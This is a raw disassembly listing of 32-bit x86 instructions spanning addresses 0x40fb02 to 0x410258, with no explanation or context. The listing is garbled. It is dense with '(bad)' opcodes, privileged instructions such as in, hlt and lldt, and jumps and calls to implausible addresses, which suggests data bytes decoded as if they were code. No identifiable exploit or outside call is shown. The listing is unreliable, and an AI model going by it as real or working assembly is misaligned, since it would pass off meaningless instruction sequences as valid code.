  40fb02:	popf   
  40fb03:	mov    esi,DWORD PTR [edx]
  40fb05:	lock mov eax,eax
  40fb08:	adc    BYTE PTR [ebx],al
  40fb0a:	or     BYTE PTR [ebx+0x4d001001],0xcf
  40fb11:	xor    ebp,DWORD PTR [edi+0x50e45189]
  40fb17:	dec    ebp
  40fb18:	mov    ecx,DWORD PTR [ebx-0x31390304]
  40fb1e:	(bad)  
  40fb1f:	iret   
  40fb20:	inc    ebp
  40fb21:	(bad)  
  40fb22:	jne    0x40fb71
  40fb24:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  40fb2a:	(bad)  
  40fb2b:	cmp    ebx,eax
  40fb2d:	je     0x40fab5
  40fb2f:	add    edi,edi
  40fb31:	or     bh,bh
  40fb33:	dec    ebp
  40fb34:	inc    ebp
  40fb35:	mov    esi,DWORD PTR [ebx]
  40fb37:	cld    
  40fb38:	add    ecx,esi
  40fb3a:	cmp    ecx,DWORD PTR [eax-0xc]
  40fb3d:	mov    edx,DWORD PTR [edi]
  40fb3f:	or     BYTE PTR [ebp-0x7c],al
  40fb42:	mov    ebx,DWORD PTR [ebp-0x7639cd18]
  40fb48:	test   BYTE PTR [ebx*4-0x76c1cdbb],cl
  40fb4f:	pushf  
  40fb50:	call   0x51eae0
  40fb55:	jne    0x40fb1e
  40fb57:	mov    ebp,esp
  40fb59:	fcomp  DWORD PTR [ebx]
  40fb5b:	add    BYTE PTR [ecx],al
  40fb5d:	inc    DWORD PTR [ebp-0x75]
  40fb60:	(bad)  
  40fb61:	cld    
  40fb62:	add    al,0xce
  40fb64:	mov    ecx,edi
  40fb66:	cld    
  40fb67:	inc    ebp
  40fb68:	fidivr WORD PTR [ebx]
  40fb6a:	fbstp  TBYTE PTR [ebp-0x3e]
  40fb6d:	mov    eax,DWORD PTR [eax]
  40fb6f:	adc    BYTE PTR [ebx-0x3974038b],cl
  40fb75:	fadd   st,st(7)
  40fb77:	add    BYTE PTR [ebp-0x1],al
  40fb7a:	mov    ecx,DWORD PTR [esp+edi*8]
  40fb7d:	inc    ebp
  40fb7e:	mov    bh,0xc7
  40fb81:	loopne 0x40fbc8
  40fb83:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  40fb89:	sbb    dh,BYTE PTR [ebx]
  40fb8b:	pushf  
  40fb8c:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  40fb92:	mov    eax,edi
  40fb94:	cwde   
  40fb95:	inc    ebp
  40fb96:	inc    ebp
  40fb97:	jne    0x40fb24
  40fb99:	mov    esp,esp
  40fb9b:	clc    
  40fb9c:	add    al,0x4d
  40fb9e:	mov    DWORD PTR [ebx],esi
  40fba0:	or     al,0x33
  40fba2:	inc    ebp
  40fba3:	lea    ecx,[ebx-0x398d13fd]
  40fba9:	add    bh,al
  40fbab:	inc    ebp
  40fbac:	ror    DWORD PTR [ebx+0x45d829],0x8b
  40fbb3:	add    ebp,esp
  40fbb5:	shufps xmm1,xmm3,0xc7
  40fbb9:	(bad)  
  40fbba:	jmp    0x748636e3
  40fbbf:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  40fbc5:	hlt    
  40fbc6:	mov    ecx,DWORD PTR [edi]
  40fbc8:	fadd   DWORD PTR [ebp+0x0]
  40fbcb:	xor    ecx,DWORD PTR [edi]
  40fbcd:	add    ecx,ecx
  40fbcf:	cmp    edi,edi
  40fbd1:	pmuludq mm7,QWORD PTR [edx+0x50]
  40fbd5:	(bad)  
  40fbd6:	jmp    0x40fb63
  40fbd8:	mov    edi,esp
  40fbda:	or     al,0xc6
  40fbdc:	inc    ebp
  40fbdd:	(bad)  
  40fbde:	mov    eax,DWORD PTR [ebp+0x10]
  40fbe1:	jne    0x40fb6c
  40fbe3:	mov    eax,DWORD PTR [ecx]
  40fbe5:	clc    
  40fbe6:	add    BYTE PTR [ebp-0x40],cl
  40fbe9:	xor    edx,DWORD PTR [eax-0x73]
  40fbec:	jne    0x40fbef
  40fbee:	push   DWORD PTR [edx+0x8]
  40fbf1:	add    BYTE PTR [ebp+0x45],al
  40fbf4:	mov    ebp,ecx
  40fbf6:	cld    
  40fbf7:	add    BYTE PTR [ebp+0x0],cl
  40fbfa:	xor    eax,DWORD PTR [ebp+0x3]
  40fbfd:	lea    edi,[ebx]
  40fbff:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  40fc05:	sub    eax,0x5d330e4d
  40fc0a:	lea    esi,[ebx]
  40fc0c:	add    DWORD PTR [ebx],eax
  40fc0e:	jb     0x40fbf9
  40fc10:	add    BYTE PTR [eax],al
  40fc12:	inc    ebp
  40fc13:	add    bl,ch
  40fc15:	inc    ebp
  40fc16:	mov    esi,DWORD PTR [ebx]
  40fc18:	or     al,0x3
  40fc1a:	(bad)  
  40fc1b:	mov    edi,eax
  40fc1d:	in     al,dx
  40fc1e:	scas   eax,DWORD PTR es:[edi]
  40fc1f:	inc    ebp
  40fc20:	mov    esi,DWORD PTR [ebx]
  40fc22:	in     al,0x3
  40fc24:	add    al,0x89
  40fc26:	mov    ecx,DWORD PTR [eax+edi*8]
  40fc29:	dec    ebp
  40fc2a:	(bad)  
  40fc2b:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3163]
  40fc32:	mov    ecx,eax
  40fc34:	cld    
  40fc35:	push   es
  40fc36:	dec    ebp
  40fc37:	add    al,0x33
  40fc39:	mov    DWORD PTR [ebx],eax
  40fc3b:	in     al,dx
  40fc3c:	cmp    DWORD PTR [ebp-0x67],eax
  40fc3f:	mov    eax,DWORD PTR [ebp-0xba0068]
  40fc45:	mov    edx,DWORD PTR [ebp-0x4]
  40fc48:	mov    ecx,DWORD PTR [ebp-0x18]
  40fc4b:	xor    ecx,DWORD PTR [ebp+0x3]
  40fc4e:	cmp    DWORD PTR [ebx],0x8b32749c
  40fc54:	xor    edi,esp
  40fc56:	jmp    0xff74f9a8
  40fc5b:	add    ecx,DWORD PTR [ebp-0x3f]
  40fc5e:	xor    ebx,DWORD PTR [edi]
  40fc60:	add    eax,ecx
  40fc62:	cmp    ebx,DWORD PTR [eax]
  40fc64:	mov    ecx,DWORD PTR [ebp-0x4]
  40fc67:	mov    ecx,DWORD PTR [eax]
  40fc69:	adc    BYTE PTR [ebp-0x80],al
  40fc6c:	jmp    0x40fc6f
  40fc6e:	mov    eax,DWORD PTR [eax]
  40fc70:	cld    
  40fc71:	mov    bh,0xc6
  40fc73:	push   ecx
  40fc74:	(bad)  
  40fc75:	jne    0x40fcd5
  40fc77:	dec    ecx
  40fc79:	or     BYTE PTR [ecx+ebx*1],cl
  40fc7c:	push   ebp
  40fc7d:	inc    ebp
  40fc7e:	in     al,dx
  40fc7f:	add    ebp,esp
  40fc81:	or     bh,al
  40fc83:	dec    ebp
  40fc84:	cld    
  40fc85:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  40fc8b:	xor    DWORD PTR [edx],0x2
  40fc8e:	pushf  
  40fc8f:	dec    DWORD PTR [ebx+0x45510cf4]
  40fc95:	mov    DWORD PTR [ebx+0x5645fc0c],ecx
  40fc9b:	mov    edx,DWORD PTR [ecx+0xc]
  40fc9e:	xor    eax,esi
  40fca0:	mov    edx,0xc172c7
  40fca5:	inc    ebp
  40fca6:	mov    esi,DWORD PTR [ebp+0x8]
  40fca9:	mov    eax,edx
  40fcab:	call   0x84c5c3a0
  40fcb0:	add    DWORD PTR [ebp-0x76bace00],ebx
  40fcb6:	mov    ebp,eax
  40fcb8:	or     BYTE PTR [eax],dl
  40fcba:	jo     0x40fd09
  40fcbc:	push   edi
  40fcbd:	xor    esi,DWORD PTR [ebp+0x3]
  40fcc0:	(bad)  
  40fcc1:	pmulhuw mm0,mm1
  40fcc4:	test   DWORD PTR [ebp-0x8],ecx
  40fcc7:	mov    DWORD PTR [ebp-0x67],eax
  40fcca:	mov    eax,DWORD PTR [ebp-0x4]
  40fccd:	xor    edi,DWORD PTR [ebp-0x73]
  40fcd0:	xor    eax,DWORD PTR [ebx]
  40fcd2:	xor    esi,DWORD PTR [edx+0x3]
  40fcd5:	add    BYTE PTR [ecx],bh
  40fcd7:	inc    ebp
  40fcd8:	(bad)  
  40fcd9:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  40fcdf:	mov    DWORD PTR [eax],0x750f0004
  40fce5:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  40fceb:	lock add BYTE PTR [ebp+0x0],al
  40fcef:	mov    esi,DWORD PTR [ebp-0x2c]
  40fcf2:	mov    ebp,edx
  40fcf4:	or     al,0x72
  40fcf6:	ja     0x40fcf8
  40fcf8:	mov    edx,esi
  40fcfa:	cld    
  40fcfb:	(bad)  
  40fcfe:	cli    
  40fcff:	mov    esi,DWORD PTR [ebp-0x4]
  40fd02:	cmp    ecx,esi
  40fd04:	bswap  edi
  40fd06:	(bad)
  40fd0a:	mov    esi,DWORD PTR [ebp-0x4]
  40fd0d:	mov    esi,ecx
  40fd0f:	clc    
  40fd10:	repnz add esi,DWORD PTR [ebp+0x45]
  40fd14:	push   ebx
  40fd15:	xor    eax,DWORD PTR [ebp+0x3]
  40fd18:	xor    BYTE PTR [edi-0x64],bl
  40fd1b:	pop    ebx
  40fd1c:	jmp    0x40fde3
  40fd21:	mov    esi,DWORD PTR [ebp-0x7d]
  40fd24:	xor    ebp,DWORD PTR [eax]
  40fd26:	lea    eax,[ebp-0x8]
  40fd29:	xor    eax,0xc7ef9cf2
  40fd2e:	neg    eax
  40fd30:	ins    DWORD PTR es:[edi],dx
  40fd31:	test   esi,edi
  40fd33:	clc    
  40fd34:	pop    esp
  40fd35:	inc    ebp
  40fd36:	or     BYTE PTR [ecx+0x450f0c7d],cl
  40fd3c:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  40fd42:	add    cl,al
  40fd44:	jne    0x40fce3
  40fd46:	mov    esi,DWORD PTR [edx]
  40fd48:	in     al,dx
  40fd49:	push   esi
  40fd4a:	xor    BYTE PTR [ebp-0xe],dh
  40fd4d:	add    edi,esi
  40fd4f:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  40fd55:	add    cl,bh
  40fd57:	mov    edi,DWORD PTR [ebp+0x8]
  40fd5a:	mov    DWORD PTR [ebp-0x14],esi
  40fd5d:	add    esi,DWORD PTR [ebp+0x3c]
  40fd60:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  40fd66:	mov    ah,0x3e
  40fd68:	popf   
  40fd69:	pushf  
  40fd6a:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  40fd70:	jne    0x40fcfd
  40fd72:	mov    ecx,DWORD PTR [esp+ebp*8]
  40fd75:	icebp  
  40fd76:	icebp  
  40fd77:	shl    edx,0xf2
  40fd7a:	(bad)  
  40fd7b:	mov    ah,0x16
  40fd7d:	pusha  
  40fd7e:	jne    0x40fd13
  40fd80:	mov    ecx,DWORD PTR [edi]
  40fd82:	in     al,dx
  40fd83:	jmp    0x40fd76
  40fd85:	add    dl,dh
  40fd87:	mov    edi,esi
  40fd89:	or     al,0x8
  40fd8b:	inc    ebp
  40fd8c:	jne    0x40fd91
  40fd8e:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  40fd94:	ret    
  40fd95:	or     bh,bh
  40fd97:	jge    0x40fd81
  40fd99:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  40fd9f:	xor    edi,eax
  40fda1:	add    esi,DWORD PTR [ebp-0x77]
  40fda4:	mov    ebx,esp
  40fda6:	clc    
  40fda7:	neg    DWORD PTR [ebp-0x7c]
  40fdaa:	xor    eax,DWORD PTR [eax]
  40fdac:	cmp    eax,DWORD PTR [eax]
  40fdae:	repz jne 0x40fd46
  40fdb1:	xor    eax,DWORD PTR [ecx]
  40fdb3:	add    ebx,DWORD PTR [eax]
  40fdb5:	mov    DWORD PTR [ebp-0x8],eax
  40fdb8:	mov    eax,edi
  40fdba:	cld    
  40fdbb:	lock pop eax
  40fdbd:	test   DWORD PTR [ebx],esi
  40fdbf:	clc    
  40fdc0:	add    edx,DWORD PTR [edi-0x740bff77]
  40fdc6:	fdivp  st(4),st
  40fdc8:	test   ecx,esi
  40fdca:	(bad)  
  40fdcb:	jnp    0x40fdcc
  40fdcd:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  40fdd3:	jae    0x40fd60
  40fdd5:	sub    edi,esp
  40fdd7:	(bad)  
  40fdd8:	shl    DWORD PTR [eax-0x3e],0x89
  40fddc:	leave  
  40fddd:	call   0x8196b4ea
  40fde2:	in     al,dx
  40fde3:	(bad)  
  40fde4:	in     al,dx
  40fde5:	add    bh,al
  40fde7:	mov    esp,edi
  40fde9:	in     al,dx
  40fdea:	test   DWORD PTR [ebp-0x8],edi
  40fded:	mov    eax,DWORD PTR [ebp+0x2b]
  40fdf0:	xor    al,BYTE PTR [ebx]
  40fdf2:	pushf  
  40fdf3:	jnp    0x572ffa2c
  40fdf9:	xor    edx,DWORD PTR [esi-0x77]
  40fdfc:	push   ecx
  40fdfd:	loopne 0x40fe32
  40fdff:	jne    0x40fdbc
  40fe01:	mov    esi,DWORD PTR [edx-0x20]
  40fe04:	add    BYTE PTR [ebp-0x3d],bh
  40fe07:	xor    eax,DWORD PTR [ebp-0x73]
  40fe0a:	mov    edi,DWORD PTR [esi]
  40fe0c:	cld    
  40fe0d:	jb     0x40fdd5
  40fe0f:	add    bl,al
  40fe11:	jne    0x40fe58
  40fe13:	mov    edx,DWORD PTR [edi-0x10]
  40fe16:	jge    0x40fe95
  40fe18:	mov    esi,DWORD PTR [ebx]
  40fe1a:	lock add ecx,DWORD PTR [ebp+0x3b]
  40fe1e:	xor    esi,DWORD PTR [ebp-0x77]
  40fe21:	mov    esi,eax
  40fe23:	lock inc ebp
  40fe25:	jge    0x40fe5c
  40fe27:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  40fe2e:	dec    ebp
  40fe2f:	mov    esi,DWORD PTR [ebx]
  40fe31:	loopne 0x40fdbc
  40fe33:	jge    0x40fe2d
  40fe35:	add    DWORD PTR [ebp-0x7d],eax
  40fe38:	cmc    
  40fe39:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  40fe40:	dec    ebp
  40fe41:	hlt    
  40fe42:	xor    ebx,DWORD PTR [ebp-0x77]
  40fe45:	mov    esi,esp
  40fe47:	in     al,0x45
  40fe49:	jge    0x40fe7c
  40fe4b:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  40fe52:	dec    ebp
  40fe53:	xor    edx,DWORD PTR fs:[ebx+0x3ec7389]
  40fe5a:	inc    ebp
  40fe5b:	hlt    
  40fe5c:	xor    eax,0xb88b9f75
  40fe61:	add    al,0x95
  40fe63:	icebp  
  40fe64:	add    dl,dh
  40fe66:	mov    DWORD PTR [ebp+0x20],ebx
  40fe69:	cmp    eax,DWORD PTR [ebp+0xf]
  40fe6c:	test   DWORD PTR [edi+ecx*1-0x1],edx
  40fe70:	fistp  WORD PTR [ebx+0x0]
  40fe73:	inc    ebp
  40fe74:	mov    ebx,DWORD PTR [edi+0xc]
  40fe77:	add    eax,eax
  40fe79:	inc    ebp
  40fe7a:	test   BYTE PTR [ebx],dh
  40fe7c:	add    eax,DWORD PTR [ebx]
  40fe7e:	add    BYTE PTR [esi+0x45],bl
  40fe81:	ret    0x85
  40fe84:	jnp    0x54418253
  40fe8a:	inc    bp
  40fe8c:	inc    ebp
  40fe8d:	xor    eax,0xc78a9cb9
  40fe92:	add    ah,bl
  40fe94:	xor    eax,DWORD PTR [ebp+0x453bf8b9]
  40fe9a:	add    BYTE PTR [ebx+0x3],dl
  40fe9d:	mov    esi,0x708088b
  40fea2:	cmp    esi,eax
  40fea4:	setge  BYTE PTR [ecx-0x74fcffce]
  40feab:	mov    esp,edi
  40fead:	call   0x33cc43ff
  40feb2:	or     BYTE PTR [ebx],al
  40feb4:	inc    ecx
  40feb5:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  40febb:	and    BYTE PTR [ebp-0x7074f0bb],al
  40fec1:	lock add cl,al
  40fec4:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  40fecb:	mov    ch,0x45
  40fecd:	clc    
  40fece:	xor    eax,DWORD PTR [ebp+0x3]
  40fed1:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  40fed7:	inc    ebp
  40fed8:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  40fede:	mov    edi,eax
  40fee0:	mov    eax,DWORD PTR [ebp+0x3c]
  40fee3:	mov    ecx,DWORD PTR [eax]
  40fee5:	hlt    
  40fee6:	inc    ebp
  40fee7:	ror    DWORD PTR [ebx+0x818c45],0xf4
  40feee:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  40fef4:	push   ebp
  40fef5:	mov    edi,DWORD PTR [ebx]
  40fef7:	in     al,dx
  40fef8:	jne    0x40febb
  40fefa:	mov    eax,DWORD PTR [ebp-0x28]
  40fefd:	add    DWORD PTR [eax],0xe8058dec
  40ff03:	clc    
  40ff04:	mov    eax,DWORD PTR [edi]
  40ff06:	clc    
  40ff07:	add    dh,dl
  40ff09:	rol    WORD PTR [ebp-0x1],cl
  40ff0d:	mov    edx,DWORD PTR [eax+0x8]
  40ff10:	jne    0x40fed2
  40ff12:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  40ff19:	inc    ebp
  40ff1a:	push   esp
  40ff1b:	test   DWORD PTR [ecx+0xf],ecx
  40ff1e:	sub    edx,esp
  40ff20:	add    eax,DWORD PTR [eax]
  40ff22:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  40ff28:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  40ff2f:	mov    eax,DWORD PTR [ecx]
  40ff31:	and    BYTE PTR [eax],al
  40ff33:	inc    eax
  40ff34:	adc    BYTE PTR [eax],al
  40ff36:	inc    ebp
  40ff37:	inc    cx
  40ff3a:	push   esp
  40ff3b:	push   es
  40ff3c:	jne    0x40ff3e
  40ff3e:	push   edx
  40ff3f:	enterw 0xc1,0x4d
  40ff44:	mov    esp,DWORD PTR [esi+0x20]
  40ff47:	add    DWORD PTR [ecx-0x7b],eax
  40ff4a:	add    eax,DWORD PTR [ebx]
  40ff4c:	str    WORD PTR [eax+0x45]
  40ff50:	lea    ecx,[ebx+0x45890801]
  40ff56:	sbb    BYTE PTR [ebx],al
  40ff58:	dec    ebp
  40ff59:	cmp    al,0xf
  40ff5b:	inc    ebp
  40ff5c:	push   eax
  40ff5d:	mov    esi,DWORD PTR [ebx]
  40ff5f:	push   eax
  40ff60:	add    eax,eax
  40ff62:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  40ff69:	inc    ebp
  40ff6a:	add    BYTE PTR ds:0x8b4d8c00,dh
  40ff70:	xor    edx,esp
  40ff72:	add    eax,esi
  40ff74:	mov    ebx,eax
  40ff76:	loopne 0x40ffbd
  40ff78:	dec    ebp
  40ff79:	mov    ecx,DWORD PTR [edi]
  40ff7b:	cld    
  40ff7c:	push   eax
  40ff7d:	xchg   DWORD PTR [ebx],esi
  40ff7f:	add    DWORD PTR [ebx],ebp
  40ff81:	add    BYTE PTR [ebx],ch
  40ff83:	or     BYTE PTR [ecx],bh
  40ff85:	dec    ecx
  40ff86:	loopne 0x40ff8b
  40ff88:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  40ff8e:	push   ebp
  40ff8f:	add    DWORD PTR [ebx+0x55100800],eax
  40ff95:	dec    ebp
  40ff96:	jmp    0x40ff21
  40ff98:	mov    esp,DWORD PTR [eax]
  40ff9a:	sbb    dl,dl
  40ff9c:	inc    eax
  40ff9d:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  40ffa3:	add    BYTE PTR [ebx+0x74528555],cl
  40ffa9:	push   ebp
  40ffaa:	div    DWORD PTR [ebx]
  40ffac:	and    eax,DWORD PTR [ebx]
  40ffae:	add    edx,DWORD PTR [edx-0x30]
  40ffb1:	jno    0x40ff3e
  40ffb3:	inc    DWORD PTR [eax+eiz*1]
  40ffb6:	inc    ebp
  40ffb7:	push   eax
  40ffb8:	push   eax
  40ffb9:	mov    esp,DWORD PTR [edi-0x74beff1c]
  40ffbf:	mov    edi,esp
  40ffc1:	push   eax
  40ffc2:	inc    ebp
  40ffc3:	enter  0x458b,0x8
  40ffc7:	push   ecx
  40ffc8:	(bad)  
  40ffc9:	call   0x10b09a1
  40ffce:	pop    ss
  40ffcf:	push   ebp
  40ffd0:	mov    ecx,DWORD PTR [ebx+0x489408]
  40ffd6:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  40ffdc:	push   ecx
  40ffdd:	jo     0x40ffc7
  40ffdf:	inc    DWORD PTR [edi]
  40ffe1:	or     BYTE PTR [eax],al
  40ffe3:	call   0xcc072d
  40ffe8:	fmul   QWORD PTR [ebp+0x55]
  40ffeb:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  40fff1:	mov    bh,0x8c
  40fff3:	adc    al,0x9d
  40fff5:	dec    esp
  40fff6:	xor    bl,BYTE PTR [eax]
  40fff8:	mov    ecx,DWORD PTR [ebp+0xc]
  40fffb:	mov    eax,DWORD PTR [ebp-0x4]
  40fffe:	mov    esi,DWORD PTR [edi-0x3148f924]
  410004:	push   es
  410005:	retf   
  410006:	mov    BYTE PTR [ebp-0x30],0x3b
  41000a:	inc    ebp
  41000b:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  410012:	retf   0x83fc
  410015:	into   
  410016:	dec    ebp
  410017:	retf   
  410018:	mov    ecx,DWORD PTR [ebp-0x74]
  41001b:	mov    eax,DWORD PTR [eax]
  41001d:	fdiv   QWORD PTR [ebx]
  41001f:	mov    bh,0x3
  410021:	push   es
  410022:	mov    esi,ecx
  410024:	sbb    cl,dl
  410026:	dec    ebp
  410027:	sar    DWORD PTR [ebx],cl
  410029:	push   ebp
  41002a:	jne    0x41003b
  41002c:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  410032:	lea    ebx,[eax]
  410034:	call   0xf4ca8bfb
  410039:	sbb    dh,dl
  41003b:	add    edx,ebx
  41003d:	push   ebp
  41003e:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  410044:	push   ecx
  410045:	mov    DWORD PTR [eax-0x30],edx
  410048:	test   DWORD PTR [edx],eax
  41004a:	xadd   esp,esi
  41004d:	pop    es
  41004e:	add    cl,dl
  410050:	mov    eax,ecx
  410052:	or     al,0x45
  410054:	(bad)  
  410055:	push   eax
  410056:	add    DWORD PTR [edx+0x0],eax
  410059:	add    ecx,DWORD PTR [ecx]
  41005b:	and    dh,cl
  41005d:	call   0xc5092d
  410062:	add    DWORD PTR [ebp+0x0],edx
  410065:	mov    esp,DWORD PTR [ebp+0x18]
  410068:	add    BYTE PTR [eax+0x28],cl
  41006b:	xor    eax,DWORD PTR [eax]
  41006d:	add    esp,DWORD PTR [esi+0x3b]
  410070:	inc    ebp
  410071:	je     0x40fff6
  410073:	push   ecx
  410074:	push   es
  410075:	dec    ebp
  410076:	mov    DWORD PTR [ebx],eax
  410078:	(bad)  
  410079:	or     al,0x1e
  41007b:	inc    eax
  41007c:	add    BYTE PTR [ebx],al
  41007e:	data16 and BYTE PTR [ebp+0x50],al
  410082:	sub    DWORD PTR [ecx],0x8
  410085:	add    BYTE PTR [ebp-0x75],ah
  410088:	add    BYTE PTR [eax],bl
  41008a:	enter  0x894d,0x8b
  41008e:	int3   
  41008f:	loopne 0x41004b
  410091:	rol    BYTE PTR [eax],0x33
  410094:	lea    cx,[ebp+0xa]
  410098:	data16 jb 0x4100e0
  41009b:	add    BYTE PTR [ebx+0x44890855],cl
  4100a1:	sbb    ah,al
  4100a3:	inc    ebp
  4100a4:	inc    eax
  4100a5:	lldt   WORD PTR [edx+0x66]
  4100a9:	xor    ecx,DWORD PTR [eax]
  4100ab:	sub    eax,DWORD PTR [esi]
  4100ad:	mov    eax,DWORD PTR [eax]
  4100af:	or     al,0x66
  4100b1:	ror    edx,cl
  4100b3:	dec    ebp
  4100b4:	inc    ebp
  4100b5:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  4100bb:	cld    
  4100bc:	or     BYTE PTR [edi+0x4501dd],dl
  4100c2:	retf   0xe0ce
  4100c5:	retf   
  4100c6:	(bad)  
  4100c7:	dec    ebp
  4100c8:	mov    al,0x8b
  4100ca:	in     al,dx
  4100cb:	and    BYTE PTR [ebx],dh
  4100cd:	or     al,BYTE PTR [ebp+0x27]
  4100d0:	in     al,dx
  4100d1:	xchg   eax,esp
  4100d3:	add    edi,eax
  4100d5:	add    BYTE PTR [eax+0x3f52ed55],bh
  4100db:	push   ebp
  4100dc:	inc    ebp
  4100dd:	xor    edx,edx
  4100df:	add    esp,eax
  4100e1:	push   edx
  4100e2:	push   bp
  4100e4:	inc    ebp
  4100e5:	jmp    ecx
  4100e7:	push   esp
  4100e8:	(bad)  
  4100e9:	inc    edx
  4100eb:	sbb    al,0x33
  4100ed:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  4100f4:	add    BYTE PTR [ebp+0x48],0x8b
  4100f8:	jmp    0xf98b:0x100041c8
  4100ff:	xor    esi,DWORD PTR [edx+0x3]
  410102:	mov    ecx,DWORD PTR [edi]
  410104:	fmul   DWORD PTR [edx]
  410106:	add    BYTE PTR [eax],al
  410108:	lea    eax,[ebx-0x4700273c]
  41010e:	add    al,0x4f
  410110:	pop    DWORD PTR [eax]
  410112:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  410118:	push   edx
  410119:	inc    WORD PTR [ebp+0x8]
  41011d:	mov    eax,0x514f4d
  410122:	(bad)
  410126:	add    al,al
  410128:	xor    DWORD PTR [ebx-0x74baf730],eax
  41012e:	test   DWORD PTR [esi+0x74],esp
  410131:	inc    ebp
  410132:	mov    DWORD PTR [eax+0xa4e08],edi
  410138:	add    BYTE PTR [ecx-0x76c435bb],cl
  41013e:	or     dh,cl
  410140:	or     eax,0x8b8d5045
  410145:	inc    ebp
  410146:	mov    WORD PTR [ecx+0x3b8a00],?
  41014c:	jne    0x410181
  41014e:	mov    edi,DWORD PTR [edx+0x8f3b18]
  410154:	add    DWORD PTR [ebx],eax
  410156:	add    bh,bh
  410158:	adc    DWORD PTR [eax],ecx
  41015a:	adc    DWORD PTR [ebp+0x55],edi
  41015d:	push   es
  41015e:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  410164:	mov    ebp,DWORD PTR [eax+ebp*1+0x503411d2]
  41016b:	inc    ebp
  41016c:	mov    edx,edi
  41016e:	or     al,0xd2
  410170:	push   eax
  410171:	(bad)  
  410172:	jne    0x410128
  410174:	call   0x28fa5b
  410179:	inc    ebp
  41017a:	shl    BYTE PTR [esp+eax*4],0xe0
  41017e:	add    bh,al
  410180:	add    BYTE PTR [ebp+esi*2-0x2c742e],bh
  410187:	(bad)  
  410188:	and    al,al
  41018a:	fs loope 0x41018c
  41018d:	inc    ebp
  41018e:	test   DWORD PTR [esi+0xf],edi
  410191:	leave  
  410192:	scas   al,BYTE PTR es:[edi]
  410193:	inc    esp
  410194:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  41019b:	or     BYTE PTR [ebx-0x97717ca],0x83
  4101a2:	call   DWORD PTR [edi]
  4101a4:	shr    ah,0x84
  4101a7:	xchg   DWORD PTR [eax],eax
  4101a9:	add    DWORD PTR [eax],eax
  4101ab:	add    bh,bh
  4101ad:	dec    ebp
  4101ae:	and    BYTE PTR [ecx-0x38],dl
  4101b1:	push   eax
  4101b2:	dec    DWORD PTR [ebx+0xfd885]
  4101b8:	mov    BYTE PTR [ebp+0x508bac00],cl
  4101be:	mov    WORD PTR [ecx+0x0],ss
  4101c1:	lea    ecx,[ebx+0x108b20d8]
  4101c7:	mov    WORD PTR [edx],ds
  4101c9:	add    BYTE PTR [edi+0xff01ff],al
  4101cf:	mov    ecx,DWORD PTR [ebp-0x28]
  4101d2:	push   ecx
  4101d3:	shl    BYTE PTR [ebp+0x3a],0x8b
  4101d7:	inc    ebp
  4101d8:	in     al,0xeb
  4101da:	jno    0x410167
  4101dc:	push   edx
  4101dd:	mov    DWORD PTR [eax-0x28],edx
  4101e0:	mov    eax,DWORD PTR [ebp+0x20]
  4101e3:	je     0x41016c
  4101e5:	mov    eax,DWORD PTR [ecx]
  4101e7:	sbb    BYTE PTR [eax],al
  4101e9:	pop    DWORD PTR [eax]
  4101eb:	add    esi,eax
  4101ed:	add    bl,al
  4101ef:	adc    DWORD PTR [edi],esi
  4101f1:	jmp    0x8bcc5243
  4101f6:	sub    BYTE PTR [ebp+eax*2-0x63c4cb00],cl
  4101fd:	jne    0x41018a
  4101ff:	mov    ecx,DWORD PTR [eax]
  410201:	in     al,0x75
  410203:	pop    DWORD PTR [ecx+0x5601]
  410209:	push   edx
  41020a:	inc    DWORD PTR [ebx]
  41020c:	adc    BYTE PTR [ecx+0x45721cc6],cl
  410212:	add    BYTE PTR [edi+0x9],dl
  410215:	call   DWORD PTR [esi]
  410217:	and    dl,al
  410219:	and    bh,bh
  41021b:	inc    edi
  41021d:	test   eax,edx
  41021f:	sldt   ebx
  410222:	xor    al,BYTE PTR [eax]
  410224:	pushf  
  410225:	(bad)  
  410226:	jmp    0x410234
  410228:	mov    eax,edi
  41022a:	or     al,0x75
  41022c:	inc    eax
  41022d:	call   0x40f935
  410232:	mov    eax,eax
  410234:	loopne 0x4101ba
  410236:	inc    ebp
  410237:	add    BYTE PTR [ebx+0x1451c00],cl
  41023d:	mov    eax,DWORD PTR [ebp+0x20]
  410240:	add    edi,ecx
  410242:	add    BYTE PTR [eax],ch
  410244:	cmp    edi,0x18
  410247:	test   DWORD PTR [ebp+0xf],esi
  41024a:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  410251:	jne    0x410255
  410253:	call   0xff9ffd18
  410258:	leave  
